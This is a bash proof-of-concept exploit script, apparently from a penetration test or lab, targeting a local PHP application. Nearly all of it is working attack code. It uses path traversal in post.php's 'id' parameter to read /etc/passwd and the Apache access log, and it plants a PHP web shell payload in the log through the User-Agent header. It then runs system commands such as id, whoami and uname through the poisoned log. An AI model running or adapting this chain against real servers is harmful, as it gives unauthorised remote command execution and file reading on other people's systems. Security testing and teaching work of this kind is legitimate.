#!/bin/bash

# POC: Remote Code Execution via LFI and Apache Log Poisoning
# Target: http://localhost:3000/post.php
# Vulnerability: LFI in 'id' parameter + Log Poisoning via User-Agent

TARGET="http://localhost:3000"
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[*] Starting RCE via LFI + Log Poisoning Exploit${NC}"
echo ""

# Step 1: Verify LFI vulnerability with /etc/passwd
echo -e "${YELLOW}[Step 1] Testing LFI vulnerability with /etc/passwd...${NC}"
LFI_TEST=$(curl -s "${TARGET}/post.php?id=../../../../../../../etc/passwd")

if echo "$LFI_TEST" | grep -q "root:x:0:0"; then
    echo -e "${GREEN}[+] LFI Confirmed! Successfully read /etc/passwd${NC}"
    echo "$LFI_TEST" | head -n 3
    echo ""
else
    echo -e "${RED}[-] LFI test failed${NC}"
    exit 1
fi

# Step 2: Verify Apache log is readable
echo -e "${YELLOW}[Step 2] Testing if Apache access.log is readable...${NC}"
LOG_TEST=$(curl -s "${TARGET}/post.php?id=../../../../../../../var/log/apache2/access.log")

if echo "$LOG_TEST" | grep -q "HTTP/1.1"; then
    echo -e "${GREEN}[+] Apache access.log is readable!${NC}"
    echo ""
else
    echo -e "${RED}[-] Cannot read Apache log${NC}"
    exit 1
fi

# Step 3: Poison the log with PHP code in User-Agent
echo -e "${YELLOW}[Step 3] Poisoning Apache log with PHP payload in User-Agent...${NC}"
PHP_PAYLOAD='<?php system($_GET["cmd"]); ?>'
curl -s -A "$PHP_PAYLOAD" "${TARGET}/" > /dev/null
echo -e "${GREEN}[+] Log poisoned with PHP code: ${PHP_PAYLOAD}${NC}"
echo ""

# Step 4: Execute commands via the poisoned log
echo -e "${YELLOW}[Step 4] Executing commands via RCE...${NC}"
echo ""

# Command 1: id
echo -e "${GREEN}[+] Executing: id${NC}"
RCE_RESULT=$(curl -s "${TARGET}/post.php?id=../../../../../../../var/log/apache2/access.log&cmd=id")
echo "$RCE_RESULT" | grep -oP "uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)\s+groups=\d+\([^)]+\)" | head -n 1
echo ""

# Command 2: whoami
echo -e "${GREEN}[+] Executing: whoami${NC}"
RCE_RESULT=$(curl -s "${TARGET}/post.php?id=../../../../../../../var/log/apache2/access.log&cmd=whoami")
echo "$RCE_RESULT" | grep -oP "www-data" | head -n 1
echo ""

# Command 3: pwd
echo -e "${GREEN}[+] Executing: pwd${NC}"
RCE_RESULT=$(curl -s "${TARGET}/post.php?id=../../../../../../../var/log/apache2/access.log&cmd=pwd")
echo "$RCE_RESULT" | grep -oP "/var/www/[^\s<]+" | head -n 1
echo ""

# Command 4: uname -a (demonstrate full system access)
echo -e "${GREEN}[+] Executing: uname -a${NC}"
RCE_RESULT=$(curl -s "${TARGET}/post.php?id=../../../../../../../var/log/apache2/access.log&cmd=uname%20-a")
echo "$RCE_RESULT" | grep -oP "Linux\s+[^\s]+\s+[^\s]+\s+[^<]+" | head -n 1
echo ""

echo -e "${RED}[!!!] CRITICAL: Remote Code Execution Confirmed!${NC}"
echo -e "${RED}[!!!] Attacker can execute arbitrary commands as www-data user${NC}"
echo ""
echo -e "${YELLOW}[*] Exploitation Chain Complete:${NC}"
echo "    1. LFI in post.php?id= parameter"
echo "    2. Apache log readable via LFI"
echo "    3. PHP code injected via User-Agent header"
echo "    4. Log inclusion executes injected PHP"
echo "    5. Commands executed via 'cmd' parameter"